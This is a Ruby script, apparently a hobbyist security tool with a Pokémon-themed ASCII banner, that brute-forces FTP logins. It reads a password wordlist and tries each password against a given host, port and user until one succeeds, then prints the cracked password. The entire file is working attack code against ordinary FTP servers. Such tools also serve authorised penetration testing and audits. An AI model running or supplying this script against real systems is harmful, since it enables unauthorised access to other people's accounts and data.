#!/usr/bin/ruby
#Basic FTP Bruteforcer.
#Mauro Eldritch @ DC5411 - 2021.
require 'net/ftp'
require 'colorize'
banner = """      

``..``  ``   ``  ``  ``  ``  ``  `.:+ ``  ``  ``
``  .sys+:-````  ``  ``  ``  ``  ./sys/`  ``  ``  
  ``  ohyyso+/:-.  `.--::::::-./shyyys- ``  ``  ``
``  `` /hyyyys+++++++yyyyyyyyyyyyyyyyo`   ``  ``  
  ``  ``:hyyyyyyso++++syyyyyyyyyyyyyo/  `.-:``  ``
-//--.. `-hyyyyyyys+++++syyyyyyyyyyo//:/++/`  ``  
  -oysoo+/syyyyyyyhyyo++++ossso+++++++++o+` ``  ``
``  .+hyyyssyyyyyys:+sys+++++++++++-/osy+```  ``  
  ``  .yhyyyyyyyyys  `o+ys+++++++++ :yy/``  ``  ``
``  `` `yyyyyyyyyyy   ` `/ys+++s+. .+yhhh+.`  ``  
  -/osssyyyyyyyhyyys+//:::+hysyyyyhyhhyo.   ``  ``
``  `.:oyhyyyyyhosyhyyyyyyyyyyyyyyyhhy/`  ``  ``  
  ``  ```:syyyyyy+/syoossyysoooyo++hy-  `/o//`  ``
``  ``   ` yhhhyyhs+//////o+//+/++y+` `-syyy+/.`  
  `` `-:::+hysyhhhhhysos++soyyhyho.-/oyhhhhhy++:``
``  `++yhhhhyo+yyysoyhyyhhyhyhy/.-yyhhysohddhyo+: 
  ``/oyhdddhys+sdddhyyhhhhyo/. ``:hhhhhhhshddhyh:`
``  +yhddysdhy+yddddddho:.`   `  `-:--sdddhdshydho
    .+y:. .hddyds/hh+-                 -oo:``. +ho
      ..  .yho:` :-                            .o`
         `/:`                                     
"""
begin
    puts banner.light_magenta
    if ARGV.length < 4    
        puts "\n[*] Usage: haunte.rb [HOST] [PORT] [USER] [PASSWORD DICTIONARY]\n[*] Example: haunte.rb 127.0.0.1 21 ftpadmin wordlist.txt".yellow
        exit 1
    end
    checked_pass = []          #Passwords array
    remaining_pass = []        #Passwords array (for comparison)
    host = ARGV[0]
    port = ARGV[1]
    user = ARGV[2]
    dictionary = ARGV[3]
    pass_list = File.readlines(dictionary).map(&:chomp)
    puts "[?] #{pass_list.count} passwords loaded from dictionary #{$default_dict}.".light_blue
    tries = 0
    pass_list.each do | this_pass |
        tries += 1
        puts "[?] Attempt #{tries}/#{pass_list.count}: #{this_pass}".light_yellow
        ftp = Net::FTP.new
        ftp.connect(host, port)
        begin
            if ftp.login(user, this_pass)
                break
            end
        rescue
            checked_pass.push("#{this_pass}")
        end
    end
    remaining_pass = (pass_list - checked_pass)
    unless pass_list.count == checked_pass.count
        passcrk = remaining_pass[0].to_s
        puts "[*] Password cracked: #{passcrk}".light_green
        cracked = true
    else
        puts  "[!] No matches found.".light_red
        cracked = false
        passcrk = "NULL"
    end
rescue => exception
    puts "Haunter has fainted: #{exception}".light_red
end